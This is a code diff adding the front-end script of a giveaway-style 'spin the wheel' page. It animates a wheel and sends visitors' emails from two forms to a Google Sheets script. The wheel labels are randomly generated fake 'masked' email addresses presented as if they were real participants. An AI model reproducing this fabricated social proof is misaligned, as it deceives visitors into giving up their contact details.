@@ -1,0 +1,243 @@
+document.addEventListener('DOMContentLoaded', () => {
+    // Spawn floating coins
+    const coinsContainer = document.getElementById('coins-container');
+    const coinCount = 15;
+
+    for (let i = 0; i < coinCount; i++) {
+        createCoin();
+    }
+
+    function createCoin() {
+        const coin = document.createElement('div');
+        coin.className = 'coin';
+
+        // Randomize position and animation
+        const left = Math.random() * 100;
+        const duration = 5 + Math.random() * 10;
+        const delay = Math.random() * 5;
+        const size = 20 + Math.random() * 30;
+
+        coin.style.left = `${left}%`;
+        coin.style.animationDuration = `${duration}s`;
+        coin.style.animationDelay = `-${delay}s`;
+        coin.style.width = `${size}px`;
+        coin.style.height = `${size}px`;
+
+        coinsContainer.appendChild(coin);
+    }
+
+    // Wheel Element (Explicit declaration)
+    const wheel = document.getElementById('wheel');
+
+    // Wheel Segments
+    // Generate Random Masked Emails
+    function generateMaskedEmail() {
+        const names = ['farid', 'sarah', 'chong', 'david', 'hafiz', 'nurul', 'rajan', 'meimei', 'ahmad', 'linda', 'azlan', 'kevin'];
+        const domains = ['gmail.com', 'yahoo.com', 'hotmail.com'];
+
+        const name = names[Math.floor(Math.random() * names.length)];
+        const suffix = Math.floor(Math.random() * 90 + 10); // 2 random digits
+        const fullUser = name + suffix; // e.g., farid45
+
+        // Masking Logic: Show 3, Mask 3, Show rest
+        if (fullUser.length < 6) return fullUser + '***@' + domains[0]; // Fallback for short names
+
+        const part1 = fullUser.substring(0, 3);
+        const part2 = '***';
+        const part3 = fullUser.substring(6); // Show from char 6 onwards
+
+        const domain = domains[Math.floor(Math.random() * domains.length)];
+        return `${part1}${part2}${part3}@${domain}`;
+    }
+
+    const emails = Array.from({ length: 15 }, () => generateMaskedEmail());
+
+    // Generate Dynamic Conic Gradient for the Wheel Background
+    // This ensures segments align perfectly regardless of count
+    const segmentAngle = 360 / emails.length;
+    let gradientParts = [];
+    for (let i = 0; i < emails.length; i++) {
+        const start = i * segmentAngle;
+        const end = (i + 1) * segmentAngle;
+        const color = (i % 2 === 0) ? '#ff0022' : '#ffffff';
+        gradientParts.push(`${color} ${start}deg ${end}deg`);
+    }
+    wheel.style.background = `conic-gradient(${gradientParts.join(', ')})`;
+
+    // Overlay Text Labels on Segments
+    emails.forEach((email, index) => {
+        const angle = index * segmentAngle + (segmentAngle / 2);
+
+        const label = document.createElement('div');
+        label.className = 'wheel-label';
+        label.innerText = email;
+
+        // Label Styles set via JS for dynamic rotation
+        Object.assign(label.style, {
+            position: 'absolute',
+            top: '50%',
+            left: '50%',
+            transform: `translate(-50%, -50%) rotate(${angle - 90}deg) translate(125px)`, // Adjusted for 15 items
+            textAlign: 'center',
+            width: '160px', // Wider for better legibility
+            fontSize: '0.8rem', // Larger text for 15 items
+            fontWeight: 'bold',
+            color: (index % 2 === 0) ? '#fff' : '#d1121d', // Contrast colors
+            fontFamily: "'Outfit', sans-serif",
+            textTransform: 'lowercase',
+            whiteSpace: 'nowrap',
+            pointerEvents: 'none'
+        });
+
+        // Slight text refinement
+        if (index % 2 !== 0) {
+            label.style.fontWeight = '800'; // Make red text slightly bolder
+        }
+
+        wheel.appendChild(label);
+    });
+
+    // Spinning logic
+    let currentRotation = 0;
+    function autoSpin() {
+        currentRotation += 720 + Math.floor(Math.random() * 360);
+        wheel.style.transform = `rotate(${currentRotation}deg)`;
+    }
+
+    setInterval(autoSpin, 5000);
+
+    // Toast Logic Removed (Caused crashes due to missing HTML)
+    // Spinning logic continued...
+
+
+    // --- MODAL LOGIC (Multi-Modal Support) ---
+    const emailModal = document.getElementById('email-modal');
+    const entry2Modal = document.getElementById('entry2-modal');
+    const entry3Modal = document.getElementById('entry3-modal');
+    const thankYouModal = document.getElementById('thank-you-modal');
+    const closeBtns = document.querySelectorAll('.close-btn');
+
+    // Generic Open Function
+    function openModal(modalEl) {
+        if (modalEl) {
+            console.log("Opening Modal:", modalEl.id);
+            modalEl.classList.add('active');
+        } else {
+            console.error("Modal element not found!");
+            // Fallback for debugging
+            alert("Error: Modal not found. Please refresh.");
+        }
+    }
+
+    // Generic Close Function
+    function closeModal() {
+        console.log("Closing all modals...");
+        document.querySelectorAll('.modal-overlay').forEach(el => {
+            el.classList.remove('active');
+        });
+    }
+
+    // Bind Close Buttons (X)
+    closeBtns.forEach(btn => {
+        btn.addEventListener('click', closeModal);
+    });
+
+    // Close on Background Click
+    document.querySelectorAll('.modal-overlay').forEach(overlay => {
+        overlay.addEventListener('click', (e) => {
+            if (e.target === overlay) closeModal();
+        });
+    });
+
+    // --- GOOGLE SHEETS INTEGRATION ---
+    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwIpS3sX5bXOtZjzE2SfYB3827TKc9aqY0G1Rl_RjynDtqd04NFWfHa5onOm_8-n7I/exec';
+
+    // Helper function to send data
+    function sendDataToSheet(email, tabName, formElement) {
+        const btn = formElement.querySelector('button[type="submit"]');
+        const originalText = btn.innerText;
+        btn.innerText = 'Sending...';
+        btn.disabled = true;
+
+        // Use URLSearchParams for x-www-form-urlencoded (Better for GAS)
+        const params = new URLSearchParams();
+        params.append('email', email);
+        params.append('tabName', tabName);
+
+        fetch(SCRIPT_URL, {
+            method: 'POST',
+            mode: 'no-cors', // CRITICAL: Bypasses CORS errors for local files
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+            },
+            body: params
+        })
+            .then(() => {
+                // With no-cors, we get an opaque response, so we assume success if it didn't throw network error
+                console.log('Request sent successfully (Opaque)');
+                // Close form modal
+                closeModal();
+                // Open Thank You Modal
+                setTimeout(() => {
+                    if (thankYouModal) openModal(thankYouModal);
+                }, 300);
+                formElement.reset();
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Connection error. Please check your internet.');
+            })
+            .finally(() => {
+                btn.innerText = originalText;
+                btn.disabled = false;
+            });
+    }
+
+    // --- FORM SUBMISSIONS ---
+    // 1. Email Form (Box 1) -> Entry1 Tab
+    const emailForm = document.getElementById('email-form');
+    if (emailForm) {
+        emailForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            const email = document.getElementById('user-email').value;
+            sendDataToSheet(email, 'Entry1', emailForm);
+        });
+    }
+
+    // 2. Login Form (Box 2) -> Entry2 Tab
+    const loginForm = document.getElementById('login-form');
+    if (loginForm) {
+        loginForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            const email = document.getElementById('login-email').value;
+            sendDataToSheet(email, 'Entry2', loginForm);
+        });
+    }
+
+    // --- BUTTON INTERACTION (Robust ID-based) ---
+    const btn1 = document.getElementById('btn-entry-1');
+    const btn2 = document.getElementById('btn-entry-2');
+    const btn3 = document.getElementById('btn-entry-3');
+
+    if (btn1) {
+        btn1.addEventListener('click', () => {
+            console.log("Clicked Button 1 -> Opening Email Modal");
+            openModal(emailModal);
+        });
+    }
+
+    if (btn2) {
+        btn2.addEventListener('click', () => {
+            console.log("Clicked Button 2 -> Opening Entry 2 Modal");
+            openModal(entry2Modal);
+        });
+    }
+
+    if (btn3) {
+        btn3.addEventListener('click', () => {
+            console.log("Clicked Button 3 -> Opening Entry 3 Modal");
+            openModal(entry3Modal);
+        });
+    }
+
+});
